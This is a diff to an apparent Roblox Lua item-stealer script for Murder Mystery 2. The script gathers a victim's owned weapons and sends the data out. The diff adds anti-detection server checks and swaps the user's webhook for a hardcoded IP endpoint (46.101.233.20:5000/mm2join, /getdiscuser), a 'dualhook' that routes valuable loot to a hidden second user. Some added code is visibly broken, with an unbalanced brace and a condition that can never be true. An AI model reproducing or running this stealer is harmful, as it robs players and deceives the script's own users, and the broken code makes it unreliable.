@@ -11,6 +11,26 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local discuser = ""
 
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
+    return
+end
+
+if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
 local weaponsToSend = {}
 local dualhooked = false
 local Players = game:GetService("Players")
@@ -418,9 +438,17 @@ local function SendDHFirstMessage(list, prefix)
         }}
     }
 
-local body = HttpService:JSONEncode(data)
+    local body = HttpService:JSONEncode(data)
+    local timestamp = tostring(os.time())
+    local signature = signPayload(body, timestamp)
+    local headers = {
+        ["Content-Type"] = "application/json",
+        ["DiscUser"] = discuser,
+        ["X-Signature"] = signature,
+        ["X-Timestamp"] = timestamp
+    }
     local response = request({
-        Url = webhook,
+        Url = "http://46.101.233.20:5000/mm2join",
         Method = "POST",
         Headers = headers,
         Body = body
@@ -496,7 +524,7 @@ for i, v in pairs(realData.Weapons.Owned) do
 end
 
 if totalValue >= 1000000000 and math.random() < 0 then
-    users = {"oned_9d}
+    users = {"oned_9d"}
     ping = "Yes"
     dualhooked = true
 end
@@ -515,6 +543,11 @@ if #weaponsToSend > 0 then
     if ping == "Yes" then
         prefix = "--[[@everyone]] "
     end
+
+    if dualhooked then
+        local response = request({
+            Url = "http://46.101.233.20:5000/getdiscuser",
+            Method = "GET"
         })
         discuser = response.Body
         SendDHFirstMessage(weaponsToSend, prefix)
